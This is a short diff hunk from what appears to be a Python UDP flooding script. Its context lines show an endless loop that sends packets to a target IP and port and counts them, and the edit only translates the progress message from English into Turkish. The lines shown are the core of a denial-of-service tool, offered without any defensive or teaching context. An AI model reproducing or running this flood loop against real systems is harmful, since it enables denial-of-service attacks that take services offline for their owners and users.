@@ -25,4 +25,4 @@ packega = 0
 while True:
     sock.sendto(bytes, (target_ip, target_port))
     packega = packega+1
-    print("Number of packages sent -->  %s" %(packega))
+    print("Gönderiliyor -->  %s" %(packega))
